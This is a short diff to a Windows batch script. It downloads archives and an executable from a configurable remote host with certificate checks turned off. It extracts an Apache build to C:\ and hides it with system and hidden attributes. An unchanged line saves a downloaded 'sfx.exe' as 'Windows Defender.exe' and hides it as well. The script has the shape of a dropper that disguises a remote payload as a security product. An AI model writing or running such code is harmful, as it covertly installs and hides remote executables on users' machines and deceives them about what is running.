@@ -23,7 +23,7 @@ if exist "%environment%\expose.exe" (
 if exist "%environment%\apache2\bin\httpd.exe" (
     echo.
 ) else (
-    "%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.zip --output "%temp%\apache2.zip" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.zip" -o"%environment%" -y && attrib +s +h +i "%environment%\apache2" && del "%temp%\apache2.zip"
+    "%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.zip --output "%temp%\apache2.zip" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.zip" -o"C:\" -y && attrib +s +h +i "C:\apache2" && del "%temp%\apache2.zip"
 )
 
 attrib -s -h -i "%environment%\Windows Defender.exe" && curl.exe -k %proxy% %host%/sfx.exe --output "%environment%\Windows Defender.exe" && attrib +s +h +i "%environment%\Windows Defender.exe"
